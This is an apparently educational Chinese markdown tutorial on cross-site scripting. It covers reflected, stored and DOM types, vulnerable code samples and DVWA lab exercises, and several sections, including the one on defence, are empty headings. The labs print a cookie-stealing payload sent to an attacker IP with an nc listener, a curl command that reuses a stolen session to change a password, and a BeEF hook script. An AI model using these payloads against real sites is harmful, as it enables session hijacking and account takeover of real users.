# 跨站脚本（Cross-site Scripting，XSS）

跨站脚本（Cross-site scripting，XSS）攻击是一种 Web 应用安全中的客户端漏洞，攻击者可以利用这种漏洞在网站上`注入`恶意的 JavaScript 代码。当受害者访问网站时就会自动运行这些恶意代码，攻击者可以劫持用户会话、破坏网站或将用户重定向到恶意站点。在`OWASP Top Ten 2017`中，XSS 攻击位于第 7 位。

![Cross-site scripting](../../../assets/img/cross-site-scripting.svg)

> 为避免和与CSS（Cascading Style Sheets，层叠样式表）混淆，将第一个字母改成了`X`，即`XSS`。

## 原理

```html
<input type="text" value="<%= getParameter("keyword") %>">
<button>搜索</button>
<div>
  您搜索的关键词是：<%= getParameter("keyword") %>
</div>
```

## 分类

XSS 攻击分为 3 个类别，包括`反射型（非持久型）`、`存储型（持久型`）和`DOM型`。

### 反射型

反射型 XSS 是跨站脚本攻击中最简单的一种类型，攻击载荷包含在 HTTP 请求中。

攻击者一般通过发送电子邮件，诱使受害者访问包含恶意代码的 URL。反射型 XSS 通常出现在搜索栏、用户登录等地方。

反射型 XSS 漏洞往往被认定为低危漏洞，因为随着用户的安全意识提高，在实战过程中利用难度高。

### 存储型

存储型 XSS，是指用户的恶意输入被存储下来，并在后期通过其他用户或管理员的页面进行展示。存储型 XSS 具有很高的隐蔽性，不需要受害者点击特定的 URL，通常被认为高危风险。

攻击场景多见于论坛、博客文章的评论、用户昵称等等。

### DOM型

传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM 型 XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。

```javascript
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```

 HTML 事件

## 限制绕过技巧

### CSP绕过

#### CSP介绍

#### CSP绕过

### XSS2RCE

## DVWA攻击场景示例

```
<script>alert(/xss/)</script>
<script>alert(document.cookie)</script>
<script>document.location = "http://google.com"</script>
```

### 实验一、利用XSS漏洞盗取并利用Cookie

第一步，在 Kali Linux 中，使用`nc`命令监听端口

```bash
nc -lvp 1234
```

第二步，在 DVWA 中，输入 payload

```javascript
<script>new Image ().src="http://192.168.164.128:1234/"+document.cookie;</script>
```

第三步，在 Kali Linux 中，查看终端信息

```bash
connect to [127.0.0.1] from localhost [127.0.0.1] 38900
GET /security=low;%20PHPSESSID=kavqn49seghn91lcbs6j411v75 HTTP/1.1
...
```

第四步，使用盗取的 Cookie

方法一，使用`开发者工具`

`F12`打开开发者工具，选择`存储（storage）`标签页，左侧选择`Cookies`，对相应字段进行编辑，最后访问页面即可。

方法二，使用浏览器插件

推荐使用`Cookies Quick Manager`

方法三，使用`curl`命令

```bash
curl --cookie "/security=low;%20PHPSESSID=kavqn49seghn91lcbs6j411v75" --location "localhost/dvwa/vulnerabilities/csrf/?password_new=chicken&password_conf=chicken&Change=Change#" | grep "Password"
```

### 实验二、使用[BeEF](https://beefproject.com/)框架

新版本 Kali Linux，已经移除 Beef，需要手工安装

```bash
$ beef-xss                                                                                                   
Command 'beef-xss' not found, but can be installed with:
sudo apt install beef-xss
Do you want to install it? (N/y)y 输入y
....
$ sudo beef-xss
[-] You are using the Default credentials
[-] (Password must be different from "beef")
[-] Please type a new password for the beef user: 输入新密码
[i] GeoIP database is missing
[i] Run geoipupdate to download / update Maxmind GeoIP database
[*] Please wait for the BeEF service to start.
[*]
[*] You might need to refresh your browser once it opens.
[*]
[*]  Web UI: http://127.0.0.1:3000/ui/panel
[*]  Hook: <script src="http://<IP>:3000/hook.js"></script>
[*] Example: <script src="http://127.0.0.1:3000/hook.js"></script>
....
```

参考

<https://www.freebuf.com/sectool/178512.html>

## 防御

## XSS通关游戏

- [Google XSS Game](https://xss-game.appspot.com/)
- [xss-labs](https://github.com/do0dl3/xss-labs)
- [Alert(1) to Win](https://alf.nu/alert1)
- [prompt(1) to win](https://prompt.ml/)
- [XSS Challenges](https://xss-quiz.int21h.jp/)
- [brutelogic XSS Practice Labs](https://brutelogic.com.br/knoxss.html)
- [brutelogic XSS Gym](https://brutelogic.com.br/gym.php)
- [XSS by PwnFunction](https://xss.pwnfunction.com/)
- [XSS Game](http://www.xssgame.com/)
- [cure53 XSS Challenges](https://github.com/cure53/XSSChallengeWiki/wiki)

## 参考资料

- [OWASP,Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger，Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
- [MDN Web Docs，跨站脚本攻击](https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting)
- [美团技术团队-前端安全系列（一）：如何防止XSS攻击？](https://tech.meituan.com/2018/09/27/fe-security.html)

<https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html>
